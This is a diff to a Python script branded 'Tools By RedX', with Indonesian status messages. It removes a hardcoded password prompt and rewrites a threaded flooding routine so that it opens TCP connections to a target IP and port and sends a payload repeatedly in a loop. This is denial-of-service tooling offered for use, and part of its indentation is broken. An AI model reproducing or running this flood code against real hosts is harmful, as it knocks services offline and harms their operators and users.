@@ -7,13 +7,7 @@ import os
 
 os.system("clear")
 print("\033[93m")
-Password = input("PASSWORD: ")
-
-if Password=="RedX":
-    print(f"""
-Password yang anda masukan Benar !! 
-    """)
-    print('''\033[94mTools By RedX
+      print('''\033[94mTools By RedX
 ██████╗░███████╗██████ ╗██╗░░██╗
 ██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
 ██████╔╝█████╗░░██║░░██║░╚███╔╝
@@ -48,8 +42,14 @@ def run2():
         i = random.choice(("[*]","[!]","[#]"))
         while True:
                 try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                         
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                             s.send(data)
+                        print("\033[92m[*] RedX Menyenggol")
+                except:
+                        print("\033[93m[*] RedX In Here Dude")
 for y in range(threads):
         if choice == 'y':
                 th = threading.Thread(target = run)
